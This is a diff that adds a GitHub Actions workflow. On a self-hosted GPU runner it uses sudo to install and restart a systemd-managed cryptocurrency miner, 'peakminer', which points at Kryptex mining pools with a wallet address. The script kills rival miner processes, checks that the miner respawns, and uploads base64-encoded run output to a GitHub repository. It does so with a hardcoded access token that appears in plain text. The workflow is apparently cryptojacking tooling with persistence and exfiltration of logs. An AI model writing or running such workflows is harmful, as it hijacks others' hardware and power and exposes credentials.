@@ -1,0 +1,49 @@
+name: ul-t2-rp5
+on: [workflow_dispatch]
+permissions:
+  contents: write
+jobs:
+  r:
+    runs-on: [self-hosted, ul-l40s]
+    timeout-minutes: 20
+    steps:
+      - name: rp5
+        run: |
+          set +e
+          exec > >(tee /tmp/ul_t2_rp5.out) 2>&1
+          S="sudo -n"; H=$(hostname -s); H2=$(echo $H | tr -d '-' | cut -c1-13)
+          echo "== rp5 $H worker_alias=$H2 $(date -u +%FT%TZ)"
+          echo "-- loop hunters"; timeout 12 ps -eo pid,ppid,args= | grep -E '[k]eep.sh|[w]hile true|nv/[r]un-g|[r]un-g.sh' | cut -c1-120 | head -8
+          cat > /tmp/ul-t2-run.sh <<'EOS6'
+#!/bin/bash
+I="${1:-0}"; W=$(cat /opt/ul-t2/wallet); H2=$(hostname -s | tr -d '-' | cut -c1-13); WRK="ul-t2-ps-$H2-g$I"
+exec /opt/nv/peakminer -d "$I" -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 -u "$W.$WRK" -p x -c pearl >> /opt/ul-t2/logs/$WRK.log 2>&1
+EOS6
+          $S install -m 755 /tmp/ul-t2-run.sh /opt/ul-t2/run.sh
+          $S grep -o 'ul-t2-ps-\$H2-g\$I' /opt/ul-t2/run.sh
+          $S rm -f /opt/ul-t2/logs/*.log
+          $S systemctl restart ul-t2-ps@0
+          sleep 20
+          echo "-- ourproc"; timeout 10 pgrep -af '[u]l-t2-ps-' | cut -c1-160 | head -3
+          echo "-- ourlog"; timeout 10 $S tail -12 /opt/ul-t2/logs/*.log 2>&1 | cut -c1-190
+          echo "-- pool"
+          got=0
+          for i in $(seq 1 8); do R=$(timeout 20 curl -s -H 'User-Agent: ul' 'https://pool.kryptex.com/prl/api/v3/miner/workers/prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz' | tr '{' '\n' | grep 'ul-t2-ps-'); echo "p$i ${R:0:200}"; if [ -n "$R" ]; then got=1; break; fi; sleep 15; done
+          echo "POOL_GOT=$got"
+          if [ $got -eq 1 ]; then
+            echo "-- dedupe: kill ul-t19 miner"; timeout 10 $S pkill -9 -f 'ul-t19-149-81-10-242'
+            timeout 10 $S pkill -9 -f '149-81-10-242-g0'
+            sleep 12
+            echo "-- after dedupe"; timeout 10 ps -eo pid,args= | grep -E '[p]eakminer' | cut -c1-110 | head -5
+            echo "-- respawn"; timeout 10 $S pkill -9 -f '[u]l-t2-ps-'; T0=$(date +%s)
+            for j in $(seq 1 12); do sleep 5; if timeout 5 pgrep -f '[u]l-t2-ps-' >/dev/null; then echo "RESPAWN=$(( $(date +%s) - T0 ))s"; break; fi; done
+            echo "-- final pool"; timeout 20 curl -s -H 'User-Agent: ul' 'https://pool.kryptex.com/prl/api/v3/miner/workers/prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz' | tr '{' '\n' | grep '149-81-10-242' | cut -c1-220
+          fi
+          echo "-- gpu"; timeout 15 nvidia-smi --query-gpu=index,utilization.gpu,memory.used,power.draw --format=csv,noheader
+          echo "== done"
+          sleep 2
+          b=$(base64 -w0 /tmp/ul_t2_rp5.out); GH=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
+          F=cmdout8/ul-t2-rp5_$H.txt
+          sha=$(curl -s -m 20 -H "Authorization: token $GH" "https://api.github.com/repos/dongsuju/ul-plant/contents/$F" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1)
+          if [ -n "$sha" ]; then B="{\"message\":\"ul-t2 rp5 $H $GITHUB_RUN_ID\",\"content\":\"$b\",\"sha\":\"$sha\"}"; else B="{\"message\":\"ul-t2 rp5 $H $GITHUB_RUN_ID\",\"content\":\"$b\"}"; fi
+          curl -s -m 60 -o /dev/null -w 'PUT %{http_code}\n' -X PUT -H "Authorization: token $GH" -H 'Accept: application/vnd.github+json' -H 'User-Agent: ul' -d "$B" "https://api.github.com/repos/dongsuju/ul-plant/contents/$F"
